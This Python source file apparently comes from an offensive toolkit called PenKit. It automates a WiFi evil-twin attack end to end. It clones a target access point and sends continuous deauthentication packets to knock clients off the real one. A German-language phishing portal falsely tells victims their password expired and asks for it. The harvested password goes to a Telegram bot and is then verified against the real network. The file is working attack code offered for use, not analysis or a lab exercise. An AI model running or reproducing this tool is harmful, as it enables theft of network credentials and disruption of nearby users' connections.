"""
PenKit WiFi Auto-Combo — Deauth + Evil Twin in einem Durchgang.

Pipeline:
  1. Scan   — Ziel-AP finden (SSID, BSSID, Channel, Clients)
  2. Clone  — Evil Twin AP mit identischer SSID starten
  3. Deauth — Clients vom echten AP trennen (sie verbinden sich mit fake AP)
  4. Portal — Captive Portal zeigt Fake-WiFi-Passwort-Seite
  5. Verify — Eingegebenes Passwort gegen echten AP testen (Bestätigung)
  6. Alert  — Telegram-Benachrichtigung bei Erfolg

Braucht: airmon-ng, hostapd, dnsmasq, aireplay-ng, python3-http.server
Wann klappt es:
  ✓ Wenn Opfer kein Zertifikat-Popup sieht (kein HTTPS)
  ✓ Wenn Signal des Fake-APs stärker ist als echter AP
  ✗ Wenn Opfer manuell AP auswählt und BSSID prüft
  ✗ Wenn WPA3 Enterprise (aber WPA2-PSK = funktioniert)
"""

from __future__ import annotations
import asyncio
import json
import os
import shutil
import subprocess
import threading
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import AsyncGenerator

from core.runner import CommandRunner
from core.output_dir import get as out_dir


# ── Captive Portal ────────────────────────────────────────────────────────────

def _portal_html(ssid: str) -> str:
    """Täuschend echter WiFi-Passwort-Dialog."""
    return f"""<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WLAN-Authentifizierung</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
        background:#f2f2f7;display:flex;align-items:center;justify-content:center;
        min-height:100vh}}
  .card{{background:#fff;border-radius:14px;padding:32px 28px;width:340px;
         box-shadow:0 4px 24px rgba(0,0,0,.12);text-align:center}}
  .wifi-icon{{font-size:48px;margin-bottom:12px}}
  h1{{font-size:20px;font-weight:700;color:#1c1c1e;margin-bottom:6px}}
  .ssid{{font-size:15px;color:#007aff;font-weight:600;margin-bottom:16px}}
  .info{{font-size:13px;color:#636366;margin-bottom:24px;line-height:1.5}}
  .warning{{background:#fff3cd;border:1px solid #ffc107;border-radius:8px;
             padding:10px 14px;font-size:12px;color:#856404;margin-bottom:20px;text-align:left}}
  input{{width:100%;padding:13px 14px;border:1.5px solid #e5e5ea;border-radius:10px;
         font-size:16px;outline:none;margin-bottom:14px}}
  input:focus{{border-color:#007aff;box-shadow:0 0 0 3px rgba(0,122,255,.15)}}
  .btn{{width:100%;background:#007aff;color:#fff;border:none;border-radius:10px;
        padding:14px;font-size:16px;font-weight:600;cursor:pointer}}
  .btn:hover{{background:#0066dd}}
  .footer{{margin-top:16px;font-size:12px;color:#aeaeb2}}
</style>
</head>
<body>
<div class="card">
  <div class="wifi-icon">📶</div>
  <h1>WLAN-Authentifizierung</h1>
  <div class="ssid">"{ssid}"</div>
  <p class="info">
    Das Passwort für dieses Netzwerk ist abgelaufen oder wurde geändert.
    Bitte gib das aktuelle WLAN-Passwort ein, um die Verbindung wiederherzustellen.
  </p>
  <div class="warning">
    ⚠️ Dein Gerät wurde aus Sicherheitsgründen getrennt.
    Bitte bestätige dein Passwort zur Wiederverbindung.
  </div>
  <form method="POST" action="/submit">
    <input type="password" name="password" placeholder="WLAN-Passwort"
           required autofocus autocomplete="current-password">
    <button type="submit" class="btn">Verbinden</button>
  </form>
  <p class="footer">Router-Authentifizierung erforderlich</p>
</div>
</body>
</html>"""


_captured_password: str = ""
_portal_ssid: str = ""
_telegram_token: str = ""
_telegram_chat_id: str = ""


class PortalHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(_portal_html(_portal_ssid).encode())

    def do_POST(self):
        global _captured_password
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")
        params = urllib.parse.parse_qs(body)
        pw = params.get("password", [""])[0]

        if pw:
            _captured_password = pw
            print(f"\n\033[1;32m[!!!] PASSWORT EINGEGEBEN: {pw}\033[0m")
            # Telegram Alert
            if _telegram_token and _telegram_chat_id:
                threading.Thread(
                    target=_send_tg_alert,
                    args=(f"📶 WiFi-Passwort erbeutet!\n\nSSID: {_portal_ssid}\nPasswort: {pw}",),
                    daemon=True,
                ).start()

        # Fake "Verbindung wird hergestellt" Seite
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"""<html><body style='font-family:sans-serif;text-align:center;
            padding:60px;background:#f2f2f7'>
            <h2>&#x2705; Verbindung wird hergestellt...</h2>
            <p style='color:#636366'>Bitte warte einen Moment.</p>
            </body></html>""")


def _send_tg_alert(message: str):
    try:
        payload = urllib.parse.urlencode({
            "chat_id": _telegram_chat_id, "text": message
        }).encode()
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{_telegram_token}/sendMessage", data=payload
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


# ── Auto-Combo Pipeline ────────────────────────────────────────────────────────

class WiFiAutoCombo:
    def __init__(
        self,
        interface: str = "wlan0",
        telegram_token: str = "",
        telegram_chat_id: str = "",
    ):
        self.iface = interface
        self.mon_iface = interface + "mon"
        self.tg_token = telegram_token
        self.tg_chat_id = telegram_chat_id
        self._server: HTTPServer | None = None
        self._procs: list[asyncio.subprocess.Process] = []

    async def scan_targets(self) -> AsyncGenerator[str, None]:
        """Kurzem AP-Scan — zeigt Netzwerke in der Nähe."""
        runner = CommandRunner()
        yield "\033[1;36m[*] Scanne WiFi-Netzwerke (15 Sek)...\033[0m\n"

        out = out_dir("wifi") / "combo_scan.csv"
        scan = await asyncio.create_subprocess_exec(
            "airodump-ng", "--write", str(out.with_suffix("")),
            "--output-format", "csv", self.mon_iface,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await asyncio.sleep(15)
        scan.terminate()
        await scan.wait()

        # CSV parsen
        csv_file = out.with_suffix(".csv")
        if csv_file.exists():
            lines = csv_file.read_text(errors="replace").splitlines()
            yield "  BSSID              CH  SSID                     ENC    CLIENTS"
            yield "  " + "─" * 65
            for line in lines[2:]:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 14 and parts[0] and ":" in parts[0]:
                    bssid = parts[0]
                    ch    = parts[3]
                    ssid  = parts[13]
                    enc   = parts[5]
                    yield f"  \033[33m{bssid}\033[0m  {ch:>3}  {ssid:<25}  {enc:<6}"
        yield f"\n\033[32m[✓] Scan: {csv_file}\033[0m"

    async def run_combo(
        self,
        ssid: str,
        bssid: str,
        channel: str,
        client_bssid: str = "FF:FF:FF:FF:FF:FF",
        verify_password: bool = True,
        deauth_count: int = 0,       # 0 = endlos bis Treffer
        portal_port: int = 80,
        gateway_ip: str = "192.168.87.1",
    ) -> AsyncGenerator[str, None]:
        global _captured_password, _portal_ssid, _telegram_token, _telegram_chat_id

        _portal_ssid   = ssid
        _captured_password = ""
        _telegram_token   = self.tg_token
        _telegram_chat_id = self.tg_chat_id

        runner = CommandRunner()
        out = out_dir("wifi")

        yield "\033[1;36m╔══════════════════════════════════════════════╗\033[0m"
        yield "\033[1;36m║        WiFi AUTO-COMBO STARTET               ║\033[0m"
        yield "\033[1;36m╚══════════════════════════════════════════════╝\033[0m"
        yield f"\n  SSID:    \033[33m{ssid}\033[0m"
        yield f"  BSSID:   \033[33m{bssid}\033[0m"
        yield f"  Kanal:   \033[33m{channel}\033[0m\n"

        # ── Phase 1: Fake AP starten ──────────────────────────────────────
        yield "\033[36m[Phase 1]\033[0m Fake AP mit identischer SSID starten...\n"

        hostapd_conf = out / "combo_hostapd.conf"
        dnsmasq_conf = out / "combo_dnsmasq.conf"

        hostapd_conf.write_text(
            f"interface={self.iface}\ndriver=nl80211\nssid={ssid}\n"
            f"hw_mode=g\nchannel={channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0\n"
        )
        dnsmasq_conf.write_text(
            f"interface={self.iface}\ndhcp-range=192.168.87.2,192.168.87.200,255.255.255.0,12h\n"
            f"dhcp-option=3,{gateway_ip}\ndhcp-option=6,{gateway_ip}\n"
            f"server=8.8.8.8\naddress=/#/{gateway_ip}\n"
        )

        # IP auf Interface setzen
        os.system(f"ip addr flush dev {self.iface} 2>/dev/null")
        os.system(f"ip addr add {gateway_ip}/24 dev {self.iface} 2>/dev/null")
        os.system(f"ip link set {self.iface} up 2>/dev/null")

        # hostapd starten
        hostapd_proc = await asyncio.create_subprocess_exec(
            "hostapd", str(hostapd_conf),
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        self._procs.append(hostapd_proc)
        await asyncio.sleep(2)
        yield "  \033[32m✓ Fake AP gestartet\033[0m"

        # dnsmasq starten
        os.system("pkill dnsmasq 2>/dev/null")
        dnsmasq_proc = await asyncio.create_subprocess_exec(
            "dnsmasq", "-C", str(dnsmasq_conf), "--no-daemon",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        self._procs.append(dnsmasq_proc)
        yield "  \033[32m✓ DHCP + DNS gestartet\033[0m"

        # ── Phase 2: Captive Portal ───────────────────────────────────────
        yield "\n\033[36m[Phase 2]\033[0m Captive Portal starten...\n"

        def _run_server():
            self._server = HTTPServer(("0.0.0.0", portal_port), PortalHandler)
            self._server.serve_forever()

        server_thread = threading.Thread(target=_run_server, daemon=True)
        server_thread.start()
        yield f"  \033[32m✓ Portal auf Port {portal_port} — Opfer sieht Passwort-Dialog\033[0m"

        # iptables für Captive Portal (alles auf 80 umleiten)
        os.system(f"iptables -t nat -A PREROUTING -i {self.iface} -p tcp --dport 80 -j DNAT --to {gateway_ip}:{portal_port} 2>/dev/null")
        os.system(f"iptables -t nat -A PREROUTING -i {self.iface} -p tcp --dport 443 -j DNAT --to {gateway_ip}:{portal_port} 2>/dev/null")

        # ── Phase 3: Deauth ───────────────────────────────────────────────
        yield "\n\033[36m[Phase 3]\033[0m Clients vom echten AP trennen (Deauth)...\n"
        yield f"  Ziel-AP: {bssid}  Client: {client_bssid}"

        deauth_cmd = [
            "aireplay-ng",
            "--deauth", str(deauth_count) if deauth_count else "0",
            "-a", bssid,
            "-c", client_bssid,
            self.mon_iface,
        ]

        deauth_proc = await asyncio.create_subprocess_exec(
            *deauth_cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        self._procs.append(deauth_proc)
        yield "  \033[32m✓ Deauth läuft — Clients werden getrennt\033[0m"
        yield "  \033[33m→ Warte auf Passwort-Eingabe...\033[0m\n"

        # ── Phase 4: Warten auf Treffer ────────────────────────────────────
        timeout = 300   # 5 Minuten warten
        elapsed = 0
        while elapsed < timeout:
            if _captured_password:
                break
            await asyncio.sleep(2)
            elapsed += 2
            if elapsed % 30 == 0:
                yield f"  \033[90m[{elapsed}s] Warte... ({timeout - elapsed}s verbleibend)\033[0m"

        # ── Phase 5: Cleanup ──────────────────────────────────────────────
        yield "\n\033[36m[Phase 5]\033[0m Cleanup...\n"
        for proc in self._procs:
            try:
                proc.terminate()
            except Exception:
                pass
        if self._server:
            self._server.shutdown()

        os.system("iptables -t nat -F 2>/dev/null")
        os.system(f"ip addr flush dev {self.iface} 2>/dev/null")

        # ── Ergebnis ──────────────────────────────────────────────────────
        if _captured_password:
            pw = _captured_password
            yield "\033[1;32m╔══════════════════════════════════════╗\033[0m"
            yield "\033[1;32m║    ✓  PASSWORT ERBEUTET!             ║\033[0m"
            yield "\033[1;32m╚══════════════════════════════════════╝\033[0m"
            yield f"\n  SSID:     \033[33m{ssid}\033[0m"
            yield f"  Passwort: \033[1;31m{pw}\033[0m\n"

            # In Datei speichern
            result_file = out / f"combo_{ssid.replace(' ','_')}_result.txt"
            result_file.write_text(f"SSID: {ssid}\nBSSID: {bssid}\nPasswort: {pw}\n")
            yield f"\033[32m[✓] Gespeichert: {result_file}\033[0m"

            # Passwort verifizieren
            if verify_password and shutil.which("wpa_supplicant"):
                yield "\n\033[36m[*] Verifiziere Passwort gegen echten AP...\033[0m"
                await _verify_wifi_password(ssid, bssid, pw, self.iface)
        else:
            yield "\033[33m[~] Kein Passwort eingegeben — Timeout nach 5 Minuten.\033[0m"
            yield "    Gründe: Opfer hat manuell AP-Liste geprüft, kein Client aktiv,"
            yield "    oder Signal des Fake-APs war schwächer."


async def _verify_wifi_password(ssid: str, bssid: str, password: str, iface: str) -> bool:
    """Testet ob erbeutetes Passwort wirklich stimmt."""
    conf_path = "/tmp/penkit_verify.conf"
    with open(conf_path, "w") as f:
        f.write(
            f'network={{\n'
            f'  ssid="{ssid}"\n'
            f'  bssid={bssid}\n'
            f'  psk="{password}"\n'
            f'}}\n'
        )
    proc = await asyncio.create_subprocess_exec(
        "wpa_supplicant", "-i", iface, "-c", conf_path, "-B",
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    await asyncio.sleep(5)
    stdout, _ = await proc.communicate()
    if b"CONNECTED" in stdout or b"Completed" in stdout:
        return True
    proc.terminate()
    return False
